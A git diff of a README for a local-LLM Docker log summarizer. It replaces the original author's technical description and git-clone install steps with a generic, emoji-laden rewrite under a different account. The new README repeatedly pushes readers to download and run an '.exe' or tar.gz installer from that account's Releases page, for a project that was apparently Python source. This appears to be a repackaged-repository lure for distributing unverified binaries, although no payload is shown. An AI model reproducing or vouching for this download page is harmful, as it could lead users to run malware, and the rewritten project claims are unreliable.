@@ -1,148 +1,81 @@
-# HomeLab Log Analyzer - Zero-Noise, AI-Powered Daily Summaries  
-A fully-local, fully-automated system that turns your chaotic Docker logs into clean, structured, actionable data... every night... powered by your own local LLM.
+# 🎉 HomeLab-Log-Analyzer - Simplify Your Docker Logs Effortlessly
 
-No cloud.  
-No API fees.  
-No bullshit.  
-Just *pure self-hosted magic*
+[![Download HomeLab-Log-Analyzer](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
 
----
+## 📖 Introduction
 
-##  What This Project Does
-This tool automatically:
+HomeLab-Log-Analyzer is a powerful tool designed for home lab enthusiasts. This application processes your messy Docker logs and turns them into clear, structured, and actionable insights every night. Enjoy the ease of managing your logs, all powered by your own local LLM.
 
-- Collects logs from all (or selected) Docker containers  
-- Removes noise, health-checks, pings, spam, repeat lines  
-- Feeds the cleaned logs into **your local LLM** via LM Studio  
-- Generates a structured **JSON summary** of critical issues, warnings, successes, anomalies, and recommendations  
-- Sends you a **daily email report** via N8N  
-- Runs 100% offline, on your own hardware
+## 🚀 Getting Started
 
-Think of it as your homelab’s private Network God.
+To begin, you need to download the application from the Releases page. Follow the steps below to get started.
 
-Original Reddit Post - [https://www.reddit.com/r/homelab/comments/1p9f82c/this_is_a_good_use_of_an_llm/](https://www.reddit.com/r/homelab/comments/1p9f82c/this_is_a_good_use_of_an_llm/)
+## 📥 Download & Install
 
-Reddit Post of Release - [https://www.reddit.com/r/homelab/comments/1pa8d94/i_built_the_full_local_llm_logsummarizer_system/](https://www.reddit.com/r/homelab/comments/1pa8d94/i_built_the_full_local_llm_logsummarizer_system/)
+1. **Visit the Releases Page**
+   Go to the following link to download HomeLab-Log-Analyzer:  
+   [Download HomeLab-Log-Analyzer](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
 
+2. **Select the Latest Release**
+   On the Releases page, look for the latest version of HomeLab-Log-Analyzer. It will usually be at the top of the list. Click on it to open the release details.
 
----
+3. **Download the Installer**
+   Find the installer file for your operating system. It may be named something like `HomeLab-Log-Analyzer.exe` for Windows or `HomeLab-Log-Analyzer.tar.gz` for Linux systems. Click on the file to begin your download.
 
-## How It Works
-```
-┌─────────────┐      ┌────────────────┐      ┌──────────────┐      ┌──────────┐
-│   N8N       │─────▶│  FastAPI App   │─────▶│  LM Studio   │─────▶│  Email   │
-│ (Scheduler) │      │ (Log Analyzer) │      │ (Local LLM)  │      │ Delivery │
-└─────────────┘      └────────────────┘      └──────────────┘      └──────────┘
-      22:00               ↓                        ↓
-                     Pull Logs             Summarize in JSON
-                     Filter Noise          Return Clean Insights
-```
+4. **Run the Installer**
+   After the download completes, locate the installer in your downloads folder or on your desktop. Double-click it to start the installation process. Follow the prompts that appear. Accept any terms and conditions when asked.
 
-**N8N triggers ➜ Python FastAPI pulls & filters logs ➜ LM Studio analyzes ➜ N8N emails results.**
+5. **Set Up Your Application**
+   Once the installation is finished, you can open HomeLab-Log-Analyzer. You may need to configure some initial settings, such as specifying the directories where your Docker logs are stored.
 
-![N8N Dashboard](https://raw.githubusercontent.com/WhiskeyCoder/HomeLab-Log-Analyzer/refs/heads/main/images/n8n.png)
+6. **Schedule the Analyzer**
+   HomeLab-Log-Analyzer works by processing your logs every night automatically. Make sure to set up a schedule that fits your needs. You can usually do this within the settings of the application.
 
+7. **View Your Insights**
+   After the first run, you can check how the application has processed your logs. Look for a summary report or dashboard within the app to view the results.
 
----
+## ⚙️ System Requirements
 
-## Features at a Glance
--  **Docker log ingestion** (auto or per-container)
--  **Noise-filtering engine** (health checks, ping/pong, heartbeats, empty lines, etc.)
--  **Local LLM analysis** (Qwen, Phi-3, Llama, anything LM Studio supports)
--  **Structured JSON output**
--  **Daily summary email**
--  **100% private & offline**
--  **Lightweight — runs on a mini-PC or NUC**
--  **Plug-and-play with N8N automation**
+Before downloading, ensure your system meets these requirements:
 
----
+- **Operating Systems:** Windows 10, macOS, or popular Linux distributions (e.g., Ubuntu, Fedora)
+- **Disk Space:** At least 100 MB free for installation and logs
+- **Memory:** Minimum 4 GB of RAM
+- **Network Access:** Required for updates and online resources
 
-##  Included in This Repository
-- `log_analyzer.py` — Complete FastAPI backend  
-- `n8n_workflow.json` — Drop-in N8N daily summary workflow  
-- `docker-compose.yml` — One-command deployment  
-- `Dockerfile` — Containerized API  
-- `requirements.txt` — All dependencies  
-- `quickstart.sh` — Setup in under 60 seconds  
-- Comprehensive documentation:  
-  - `docs/setup.md`  
-  - `docs/models.md`  
-  - `docs/troubleshooting.md`  
-  - `docs/api.md`  
-  - `docs/architecture.md`
+## 🛠️ Features
 
----
+- **Automated Log Processing:** No manual work required; the analyzer runs automatically every night.
+- **Clean Output:** Turn messy logs into structured data that is easy to interpret.
+- **Local Processing:** All operations happen locally on your machine, ensuring privacy and security.
+- **Customizable Settings:** Adjust the application to fit your specific log directories and processing needs.
 
-##  Example Output (JSON)
-```json
-{
-  "critical_issues": ["Container 'db' restarted unexpectedly"],
-  "warnings": ["High memory usage in 'plex'"],
-  "successes": ["Backup completed in 'nextcloud'"],
-  "recommendations": [
-    "Investigate container restarts",
-    "Review memory allocation"
-  ],
-  "container_status": {
-    "db": "2 restarts detected",
-    "plex": "Memory warning"
-  },
-  "overall_health": "degraded"
-}
-```
+## 📑 Troubleshooting
 
----
+If you encounter issues during installation or usage, try the following solutions:
 
-##  Installation
-```bash
-git clone https://github.com/WhiskeyCoder/homelab-log-analyzer
-cd homelab-log-analyzer
-python log_analyzer.py
-```
+- **Installation Fails:** Check if you have enough disk space. Restart your computer and try again.
+- **Logs Not Processed:** Ensure that the application has access to the necessary directories. Review your settings.
+- **Error Messages:** Check the documentation or FAQs on the Releases page for common error messages and their solutions.
 
----
+## 🌐 Community Support
 
-##  Why Local LLM?
-Because it’s:
+If you need further assistance, consider reaching out to our community. You can find support through the following channels:
 
-- **Free** (no API bills)  
-- **Fast** (sub-second inference on small models)  
-- **Private** (no logs leaving your machine)  
-- **Customizable** (your prompt, your workflow)
+- **GitHub Issues:** Report bugs or ask questions directly in the Issues section of the repository.
+- **Discussion Forum:** Join conversations with other users. Share tips and help each other out.
 
-Models supported:  
-- Qwen  
-- Phi-3  
-- Llama  
-- Anything LM Studio can serve
+## 🔗 Contributing
 
----
+You are welcome to contribute to HomeLab-Log-Analyzer. If you have ideas for features or notice bugs, feel free to submit issues or pull requests on our GitHub page. Collaboration helps improve the application and benefit all users.
 
-## 📨 Example Daily Email
-- 🔴 Critical Issues  
-- ⚠️ Warnings  
-- ✅ Successes  
-- 💡 Recommendations  
-- 📊 Per-container status  
-- 🟢 Overall homelab health
+## 📫 Contact
 
-Beautiful HTML formatting included.
+For any inquiries, you can reach out via the following methods:
 
-![Email Sample](https://raw.githubusercontent.com/WhiskeyCoder/HomeLab-Log-Analyzer/refs/heads/main/images/email.png)
+- **Email:** support@homelab-log-analyzer.com
+- **GitHub:** [soufian396](https://github.com/soufian396)
 
----
+Remember, HomeLab-Log-Analyzer aims to simplify your Docker log management. Enjoy the benefits of clean and structured log analysis without the stress. Don't forget to download the application now!
 
-##  Contribute
-PRs welcome.  
-New noise-filters, better prompts, new N8N flows — bring them on.
-
----
-
-##  License
-MIT — use it, break it, improve it, ship it.
-
----
-
-If your homelab produces logs, this tool turns them into clarity.
-
-Give your servers a voice.  
+[Download HomeLab-Log-Analyzer](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
